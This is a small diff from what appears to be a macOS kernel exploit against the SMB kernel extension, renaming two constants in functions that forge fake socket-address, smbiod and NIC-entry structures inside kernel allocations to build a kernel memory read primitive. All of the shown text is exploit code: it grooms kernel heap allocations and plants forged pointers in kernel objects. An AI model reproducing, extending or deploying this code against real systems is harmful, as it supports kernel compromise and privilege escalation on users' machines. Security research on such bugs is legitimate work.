@@ -51,7 +51,7 @@ void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem
 void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert_cond(session->sock_addr_addr, ==, 0);
     
-    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&kmem_read_session_NIC_SADDR, sizeof(kmem_read_session_NIC_SADDR));
+    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
     uintptr_t fake_sock_addr_addr = entry.address + 8;
     
     session->sock_addr_addr = fake_sock_addr_addr;
@@ -92,7 +92,7 @@ void kmem_read_session_build_iod(kmem_read_session_t session, const struct socka
     assert(offsetof(struct smbiod, iod_gss.gss_spn) >= fake_iod_start);
     assert(offsetof(struct smbiod, iod_gss.gss_spn) + offsetof(struct complete_nic_info_entry, addr_list.tqh_first) + 8 < fake_iod_end);
     struct complete_nic_info_entry* fake_nic_entry = (struct complete_nic_info_entry*)((char*)&fake_iod + offsetof(struct smbiod, iod_gss.gss_spn));
-    fake_nic_entry->nic_index = kmem_read_session_NIC_INDEX;
+    fake_nic_entry->nic_index = FAKE_SESSION_NIC_INDEX;
     fake_nic_entry->addr_list.tqh_first = (struct sock_addr_entry*)session->sock_addr_entry_addr;
     
     assert(offsetof(struct smbiod, iod_ref_cnt) >= fake_iod_start);
